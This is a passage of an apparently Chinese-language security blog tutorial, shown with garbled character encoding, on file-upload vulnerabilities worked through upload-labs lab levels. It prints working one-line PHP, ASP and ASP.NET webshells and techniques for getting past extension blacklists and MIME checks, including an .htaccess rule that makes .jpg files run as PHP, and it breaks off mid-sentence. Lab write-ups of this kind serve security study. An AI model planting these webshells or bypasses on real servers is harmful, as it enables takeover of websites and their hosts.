        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ ç®€ä»‹"><a href="#æ–‡ä»¶ä¸Šä¼ ç®€ä»‹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç®€ä»‹"></a>æ–‡ä»¶ä¸Šä¼ ç®€ä»‹</h1><p>æ–‡ä»¶ä¸Šä¼ ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½è¡Œä¸ºã€‚å°†å®¢æˆ·ç«¯æ•°æ®ä»¥æ–‡ä»¶å½¢å¼å°è£…ï¼Œé€šè¿‡ç½‘ç»œåè®®å‘é€åˆ°æœåŠ¡å™¨ç«¯ã€‚åœ¨æœåŠ¡å™¨ç«¯è§£ææ•°æ®ï¼Œæœ€ç»ˆåœ¨æœåŠ¡ç«¯ç¡¬ç›˜ä¸Šä½œä¸ºçœŸå®çš„æ–‡ä»¶ä¿å­˜ã€‚</p><p><strong>æ¼æ´äº§ç”ŸåŸå› </strong>ï¼šå¤§éƒ¨åˆ†çš„ç½‘ç«™å’Œåº”ç”¨ç³»ç»Ÿéƒ½æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¸€äº›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œå¯¼è‡´å…è®¸æ”»å‡»è€…å‘æŸä¸ªå¯é€šè¿‡ Web è®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„ PHP æ–‡ä»¶ï¼Œå¹¶èƒ½å¤Ÿå°†è¿™äº›æ–‡ä»¶ä¼ é€’ç»™ PHP è§£é‡Šå™¨ï¼Œå°±å¯ä»¥åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPè„šæœ¬ã€‚å¦å¤–ï¼ŒæœåŠ¡å™¨é…ç½®ä¸å½“ã€å¼€æºç¼–è¾‘å™¨çš„ä¸Šä¼ æ¼æ´ã€æ–‡ä»¶ä¸Šä¼ é™åˆ¶è¢«ç»•è¿‡ã€æ–‡ä»¶è§£ææ¼æ´å¯¼è‡´æ–‡ä»¶æ‰§è¡Œç­‰éƒ½æœ‰å¯èƒ½äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><p><strong>æ¼æ´å±å®³</strong>:å½“ç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†ç—…æ¯’ï¼Œæœ¨é©¬ï¼ŒWebShellï¼Œå…¶ä»–æ¶æ„è„šæœ¬æˆ–è€…æ˜¯åŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¦‚æœå¯¹å…¶è§£ææ‰§è¡Œåˆ™ä¼šé€ æˆå¾ˆå¤§çš„å±å®³ã€‚</p><blockquote><p>WebShell å°±æ˜¯ä»¥ aspã€phpã€jsp æˆ–è€… cgi ç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°ä¹‹ä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚æ”»å‡»è€…åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†è¿™äº› asp æˆ– php åé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨ web ç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®è¿™äº›åé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ï¼ˆå¯ä»¥ä¸Šä¼ ä¸‹è½½æˆ–è€…ä¿®æ”¹æ–‡ä»¶ï¼Œæ“ä½œæ•°æ®åº“ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ç­‰ï¼‰ã€‚</p></blockquote><h1 id="ç»•è¿‡æ–‡ä»¶æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶æ£€æµ‹</h1><p>é€šå¸¸ä¸€ä¸ªæ–‡ä»¶ä»¥HTTPåè®®è¿›è¡Œä¸Šä¼ æ—¶ï¼Œå°†ä»¥POSTè¯·æ±‚å‘é€è‡³WebæœåŠ¡å™¨ï¼ŒWebæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚å¹¶åŒæ„åï¼Œç”¨æˆ·ä¸WebæœåŠ¡å™¨å°†å»ºç«‹è¿æ¥ï¼Œå¹¶ä¼ è¾“æ•°æ®ã€‚ä¸€èˆ¬ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­çš„<strong>æ£€æµ‹æ–¹å¼</strong>æœ‰âˆ¶</p><ol><li>å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åï¼‰</li><li>æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹content-typeå†…å®¹)</li><li>æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹)</li><li>æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰ç­‰ã€‚</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416130421578.png" alt="image-20210416130421578"></p><h2 id="ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹"><a href="#ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹" class="headerlink" title="ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹"></a>ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹</h2><p>åŸç†ï¼šé€šå¸¸åœ¨ä¸Šä¼ é¡µé¢é‡Œå«æœ‰ä¸“é—¨æ£€æµ‹æ–‡ä»¶ä¸Šä¼ çš„JavaScriptä»£ç ï¼Œæœ€å¸¸è§çš„å°±æ˜¯æ£€æµ‹æ–‡ä»¶ç±»å‹å’Œæ‰©å±•åæ˜¯å¦åˆæ³•ã€‚</p><p>æ–¹æ³•ï¼šåœ¨æœ¬åœ°æµè§ˆå™¨å®¢æˆ·ç«¯ç¦ç”¨JSå³å¯;å¯ä½¿ç”¨ç«ç‹æµè§ˆå™¨çš„Noscriptæ’ä»¶ã€IEä¸­ç¦ç”¨JSç­‰æ–¹å¼å®ç°ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-01</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415231636662.png" alt="image-20210415231636662"></p><p>è¿™é‡Œçš„jsæ£€æµ‹æ–‡ä»¶çš„æ‰©å±•åï¼Œåªå…è®¸.jpgã€.pngã€.gifæ–‡ä»¶ä¸Šä¼ ã€‚</p><p>ä½†æˆ‘ä»¬å¯ä»¥ç¦ç”¨æ­¤jsï¼Œæˆ–è€…ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼ˆä¸Šä¼ 1.jpgä¿®æ”¹ä¸º1.phpï¼‰</p><p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œä¸Šä¼ æœ€ç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415233539502.png" alt="image-20210415233539502"></p><p>æŸ¥çœ‹phpinfo()</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234903809.png" alt="image-20210415234903809"></p><p>ä¸Šèœåˆ€ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä¸ªç½‘ç«™çš„ç»“æ„å’Œæ–‡ä»¶ï¼Œç”šè‡³æ˜¯æš´éœ²äº†ä¸»æœºçš„ç£ç›˜å­˜å‚¨ï¼ï¼å¯ä»¥è¿›è¡Œä»»æ„éæ³•å¢åˆ æŸ¥æ”¹ï¼ï¼ç½‘ç«™ï¼ˆä¸»æœºï¼‰è‡³æ­¤æ²¦é™·â€¦â€¦</p><blockquote><p>**â€ä¸­å›½èœåˆ€â€**ï¼šä»…éœ€è¦ä¸€æ®µç®€çŸ­çš„ä»£ç ä¾¿å¯ä»¥ç®¡ç†ç½‘ç«™ã€‚ç›®å‰æ”¯æŒçš„æœåŠ¡å™¨ç«¯è„šæœ¬åŒ…æ‹¬: phpã€ASPã€ASP.NETã€JSPç­‰ï¼Œå¹¶ä¸”æ”¯æŒHTTPSå®‰å…¨è¿æ¥çš„ç½‘ç«™ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;</span><br><span class="line">ASP: &lt;%eval request(&quot;mima&quot;)%&gt;</span><br><span class="line">ASP.NET &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234719164.png" alt="image-20210415234719164"></p><h2 id="ç»•è¿‡MIMEç±»å‹æ£€æµ‹"><a href="#ç»•è¿‡MIMEç±»å‹æ£€æµ‹" class="headerlink" title="ç»•è¿‡MIMEç±»å‹æ£€æµ‹"></a>ç»•è¿‡MIMEç±»å‹æ£€æµ‹</h2><p>åŸç†ï¼šæ£€æµ‹å›¾ç‰‡ç±»å‹æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­httpåŒ…çš„Content-Typeå­—æ®µçš„å€¼ï¼Œæ¥åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åˆæ³•ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼šç”¨burpsuiteæˆªå–å¹¶ä¿®æ”¹æ•°æ®åŒ…ä¸­æ–‡ä»¶çš„content-typeç±»å‹è¿›è¡Œç»•è¿‡ã€‚</p><p>å¸¸è§MIMEç±»å‹ï¼š</p><ul><li>htmlæ–‡ä»¶ï¼štext/html</li><li>txtæ–‡ä»¶ï¼štext/plain</li><li>pdfæ–‡æ¡£ï¼šapplication/pdf</li><li>wordæ–‡ä»¶ï¼šapplication/msword</li><li>pngå›¾ç‰‡ï¼šimage/png</li><li>jpegå›¾ç‰‡ï¼šimage/jpeg</li><li>gifå›¾ç‰‡ï¼šimage/gif</li></ul><p>æµ‹è¯•ï¼šupload-labs/Pass-02</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132434036.png" alt="image-20210416132434036"></p><p>é€šè¿‡å…¶æºç å‘ç°ä»…ä»…åˆ¤æ–­content-typeç±»å‹ï¼Œå› æ­¤ä¸Šä¼ 1.phpæŠ“åŒ…ä¿®æ”¹content-typeä¸ºå›¾ç‰‡ç±»å‹ï¼šimage/jpegã€image/pngã€image/gif</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132812123.png" alt="image-20210416132812123"></p><p>æˆåŠŸåˆ©ç”¨</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132939840.png" alt="image-20210416132939840"></p><h2 id="ç»•è¿‡é»‘åå•æ£€æµ‹"><a href="#ç»•è¿‡é»‘åå•æ£€æµ‹" class="headerlink" title="ç»•è¿‡é»‘åå•æ£€æµ‹"></a>ç»•è¿‡é»‘åå•æ£€æµ‹</h2><p>é»‘åå•ç­–ç•¥</p><p>æ–‡ä»¶æ‰©å±•ååœ¨é»‘åå•ä¸­ä¸ºä¸åˆæ³•ï¼Œä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„blacklistæ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«å¸¸è§çš„å±é™©è„šæœ¬æ–‡ä»¶ã€‚</p><p>ç»•è¿‡æ–¹æ³•</p><p><strong>1.åç¼€å¤§å°å†™ç»•è¿‡</strong>ï¼š</p><p>åœ¨å¯¹åç¼€çš„åˆ¤æ–­ä¸­ï¼Œå¦‚æœåªæ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œå•ç‹¬çš„æ¯”è¾ƒæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯é™åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥é‡‡ç”¨åç¼€åå¤§å°å†™ç»•è¿‡å½¢å¼ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-06</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221001633.png" alt="image-20210418221001633"></p><p>è¿™é‡Œå¯¹æ–‡ä»¶åç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æœªå¯¹å­—æ¯å¤§å°å†™åšä»»ä½•å¤„ç†ï¼Œå¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221031495.png" alt="image-20210418221031495"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221148741.png" alt="image-20210418221148741"></p><p><strong>2.ç©ºæ ¼ç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»ç©ºå¤„ç†ï¼Œå¯ä»¥é€šè¿‡åœ¨åç¼€åååŠ ç©ºè¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p><strong>3.ç‚¹ç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå».å¤„ç†ï¼Œåˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§,ä¼šè‡ªåŠ¨å»æ‰åç¼€åæœ€åçš„.ï¼Œé€šè¿‡åœ¨æ–‡ä»¶åååŠ .è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p>4.<code>::$DATA</code>ç»•è¿‡:</p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»<code>::$DATA</code>å¤„ç†ï¼Œåˆ©ç”¨Windowsä¸‹NTFSæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼ˆåœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒâ€<code>::$DATA</code>â€œä¹‹å‰çš„æ–‡ä»¶åï¼‰ï¼Œå¯ä»¥åœ¨åç¼€åååŠ <code>::$DATA</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418225806235.png" alt="image-20210418225806235"></p><p><strong>5.åŒåç¼€åç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ˜¯å°†é—®é¢˜åç¼€åæ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p><strong>6.é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡:</strong></p><ol><li><p>IISè§£ææ¼æ´<br>åœ¨IIS6.0çš„æƒ…å†µä¸‹æœ‰ä¸‰ç§å¯ä»¥åˆ©ç”¨çš„æ‰‹æ®µ</p><ul><li>ç›®å½•è§£ææ¼æ´ï¼šå»ºç«‹<code>*.asa</code>ã€<code>*.asp</code>æ ¼å¼çš„æ–‡ä»¶å¤¹æ—¶å…¶ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½ä¼šå½“åšaspæ–‡ä»¶è§£æã€‚</li><li>å½“æ–‡ä»¶åä¸º<code>*.asp;1.jpg</code>æ—¶ï¼ŒIISä¼šä»¥ASPæ–‡ä»¶æ¥è§£æï¼Œä¹Ÿå°±æ˜¯è¯´;èµ·åˆ°äº†æˆªæ–­ä½œç”¨ã€‚</li><li>WebDavæ¼æ´ï¼Œå€ŸåŠ©putæ–¹æ³•ç›´æ¥å‘æœåŠ¡å™¨ä¸Šä¼ å±é™©è„šæœ¬</li></ul></li><li><p>Apacheè§£ææ¼æ´<br>åœ¨Apache 1.Xä¸Apache 2.Xä¸­å¦‚æœç¢°åˆ°æ–‡ä»¶åä¸º<code>demo.php.test</code>çš„æ–‡ä»¶ä¼šæŒ‰phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œæ ¹æ®Apacheçš„è§£æè§„åˆ™ï¼Œå¦‚æœç¢°åˆ°ä¸è®¤è¯†çš„æ‹“å±•åä¾¿ä¼šè¿›è¡Œéå†ï¼Œç›´åˆ°ç¢°åˆ°èƒ½å¤Ÿè§£æçš„æ‹“å±•åã€‚</p><blockquote><p>åœ¨Apacheæ ¹ç›®å½•çš„coof/mime.typesæ–‡ä»¶ä¸­æœ‰è¯¦ç»†çš„å¯è¯†åˆ«æ‹“å±•åã€‚</p></blockquote></li><li><p>Nginxè§£ææ¼æ´</p></li></ol><p>åœ¨Nginxçš„æœåŠ¡å™¨ç¯å¢ƒä¸‹ï¼Œå‡å¦‚æˆåŠŸä¸Šä¼ ä¸€å¼ åä¸ºtest.jpgçš„æ–‡ä»¶åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬è®¿é—®<code>www.demo.com/test.jpg/test.php</code>è¿™ä¸ªè™šæ„çš„ç›®å½•æœåŠ¡å™¨åˆ™ä¼šç›´æ¥å°†test.jpgä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æã€‚</p><p><strong>7.htaccessç»•è¿‡</strong></p><p>å½“ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶åˆ°ç½‘ç«™ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šæŒ‰å…¶é…ç½®ç”Ÿæ•ˆè§£æã€‚</p><p>æ¡ä»¶</p><ul><li>apacheæœåŠ¡å™¨</li><li>èƒ½å¤Ÿä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºé»‘åå•é™åˆ¶ã€‚</li><li>AllowOverride Allï¼ˆé»˜è®¤é…ç½®ä¸ºå…³é—­Noneï¼‰</li><li>LoadModule rewrite_module modules/mod_rewrite.so #rewriteæ¨¡å—ä¸ºå¼€å¯çŠ¶æ€</li><li>ä¸Šä¼ ç›®å½•å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</li></ul><p>æµ‹è¯•ï¼šupload-labs/Pass-04</p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ä»£ç å¯¹å¸¸è§çš„å¤šç§ç±»å‹æ–‡ä»¶åç¼€åè¿›è¡Œäº†é™åˆ¶ä¸Šä¼ ï¼Œä½†æ˜¯ä»”ç»†å¯ä»¥å‘ç°ï¼Œå¹¶æ²¡æœ‰å¯¹<code>htaccess</code>æ–‡ä»¶è¿›è¡Œé™åˆ¶ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ª<code>htaccess</code>æ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œè¿›è¡Œç»•è¿‡æ£€æµ‹ä¸Šä¼ ã€‚</p><p>.htaccessæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå½“æˆphpæ¥è§£æ</p><h2 id="ç»•è¿‡ç™½åå•æ£€æµ‹"><a href="#ç»•è¿‡ç™½åå•æ£€æµ‹" class="headerlink" title="ç»•è¿‡ç™½åå•æ£€æµ‹"></a>ç»•è¿‡ç™½åå•æ£€æµ‹</h2><p>ç™½åå•ç­–ç•¥ï¼šæ–‡ä»¶æ‰©å±•åä¸åœ¨ç™½åå•ä¸­ä¸ºä¸åˆæ³•ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼šæœåŠ¡ç«¯åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯ä»åå¾€å‰åˆ¤æ–­ï¼Œè€Œå¯¹æ–‡ä»¶è§£ææ˜¯ä»å‰å¾€åè§£æï¼Œå¯ä»¥åˆ©ç”¨00æˆªæ–­çš„æ–¹<br>å¼è¿›è¡Œç»•è¿‡ã€‚å¦‚åº”ç”¨æœ¬æ¥åªå…è®¸ä¸Šä¼ jpgå›¾ç‰‡ï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ 